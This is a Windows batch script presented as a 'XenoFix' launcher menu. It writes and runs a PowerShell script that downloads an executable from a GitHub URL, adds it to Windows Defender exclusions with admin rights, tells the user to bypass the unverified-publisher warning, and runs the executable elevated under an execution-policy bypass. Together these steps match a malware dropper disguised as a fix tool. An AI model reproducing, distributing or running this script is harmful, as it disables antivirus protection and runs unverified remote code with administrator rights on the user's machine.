@echo off
echo.
echo ================ Run XenoFix =================
echo 1. XenoFix
echo 2. Exit
echo.
set /p choice=Enter your choice (1-2): 
if %choice%==1 goto start
if %choice%==2 goto exit
echo Invalid choice. Please try again.
goto start

:start
REM Save the PowerShell script to a file
echo # Define variables > "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo $url = "https://github.com/madeby3213/Xeno-fix/raw/refs/heads/main/xeno%20fix.exe" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo $output_file = "$env:USERPROFILE\Downloads\xeno%fix.exe" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo $log_file = "$env:USERPROFILE\Downloads\download.log" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo # Create the directory if it doesn't exist >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo if (-not (Test-Path "$env:USERPROFILE\Downloads")) { >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     New-Item -ItemType Directory -Path "$env:USERPROFILE\Downloads" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo } >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo # Log the start of the download process >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo Add-Content -Path $log_file -Value "Starting download at $(Get-Date)" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo # Download the file using PowerShell >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo try { >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     Invoke-WebRequest -Uri $url -OutFile $output_file -ErrorAction Stop >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     Add-Content -Path $log_file -Value "File downloaded successfully at $(Get-Date)" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     # Check if the file size is greater than 0 KB >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     $fileInfo = Get-Item $output_file >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     if ($fileInfo.Length -gt 0) { >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         # Add the downloaded file to Windows Defender exclusions >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         Start-Process powershell -ArgumentList "Add-MpPreference -ExclusionPath $output_file -ErrorAction Stop" -Verb RunAs >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         # Prompt the user to manually approve the downloaded file >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         Write-Host "Please manually approve the downloaded file if you see a 'Publisher Not Verified' warning." >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         Write-Host "You can find the file at: $output_file" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         # Run the downloaded file as administrator >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         Start-Process -FilePath $output_file -Verb RunAs >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     } else { >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         Add-Content -Path $log_file -Value "Download failed: file size is 0 KB at $(Get-Date)" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo         Write-Host "Download failed: file size is 0 KB" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     } >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo } catch { >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     Add-Content -Path $log_file -Value "Download failed at $(Get-Date): $_" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo     Write-Host "Download failed: $_" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo } >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo # Log the end of the script >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo Add-Content -Path $log_file -Value "Script ended at $(Get-Date)" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"

REM Run the PowerShell script
powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
goto :eof

:exit
exit
